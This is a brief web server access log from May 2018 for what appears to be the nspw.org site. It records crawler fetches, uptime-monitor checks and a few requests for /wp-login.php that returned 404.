119.94.67.162 - - [02/May/2018:23:49:46 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
119.94.67.162 - - [02/May/2018:23:49:46 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
174.99.27.117 - - [02/May/2018:23:50:14 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
174.99.27.117 - - [02/May/2018:23:50:15 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [02/May/2018:23:50:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
105.102.64.219 - - [02/May/2018:23:52:15 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
105.102.64.219 - - [02/May/2018:23:52:17 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
194.187.170.110 - - [02/May/2018:23:52:41 -0400] "GET /2006/program.content HTTP/1.1" 200 14331 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
69.162.124.227 - - [02/May/2018:23:55:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.66.91 - - [02/May/2018:23:58:24 -0400] "GET /2018/dates HTTP/1.1" 200 6270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
69.162.124.227 - - [03/May/2018:00:00:20 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
194.187.170.110 - - [03/May/2018:00:00:44 -0400] "GET /2006/past.content HTTP/1.1" 200 5670 "-" "Mozilla/5.0 (compatible; Qwantify/2.4w; +https://www.qwant.com/)/2.4w"
